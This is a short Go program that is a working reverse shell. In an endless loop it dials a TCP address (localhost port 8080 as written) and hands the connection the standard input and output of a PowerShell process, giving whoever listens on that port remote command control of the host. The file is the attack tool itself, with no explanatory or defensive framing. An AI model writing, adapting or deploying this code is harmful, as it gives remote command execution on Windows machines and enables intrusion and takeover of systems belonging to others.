package main

import (
	"net"
	"os/exec"
)

func main() {
	for {
		con, _ := net.Dial("tcp", "127.0.0.1:8080")
		cmd := exec.Command("powershell")
		cmd.Stdin, cmd.Stdout, cmd.Stderr = con, con, con
		_ = cmd.Run()
	}
}
